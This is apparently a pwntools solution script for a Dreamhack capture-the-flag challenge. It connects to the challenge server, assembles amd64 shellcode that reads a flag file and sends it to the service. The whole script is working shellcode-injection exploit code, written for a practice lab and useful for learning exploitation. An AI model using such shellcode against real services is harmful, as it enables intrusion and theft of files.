from pwn import *

# nc host3.dreamhack.games 17188
p = remote("host3.dreamhack.games",17188)
context.arch="amd64"


p.recvuntil("shellcode: ")

sh = asm(shellcraft.cat("/home/shell_basic/flag_name_is_loooooong"))

p.sendline(sh)

p.interactive()